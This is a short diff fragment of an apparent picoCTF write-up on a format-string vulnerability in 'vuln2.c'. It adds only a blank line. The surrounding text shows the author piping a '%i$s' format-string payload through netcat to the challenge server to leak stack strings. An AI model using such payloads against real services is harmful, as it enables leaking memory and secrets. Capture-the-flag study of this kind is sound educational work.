@@ -102,6 +102,7 @@ Also in the `vuln2.c` file (which is our soure), whatever we add is given back t
     }
 
 So in the input I try to add memory holder `%i$s` and as an output i get the string at the ith string compartment
+    
     snorlux@MrinalPC:/mnt/f/Cryptonite_taskphase2_Mrinal/Binary$ %4$s
     echo "%$i\$s" | nc saturn.picoctf.net 59356
     Tell me a story and then I'll tell you one >> Here's a story -
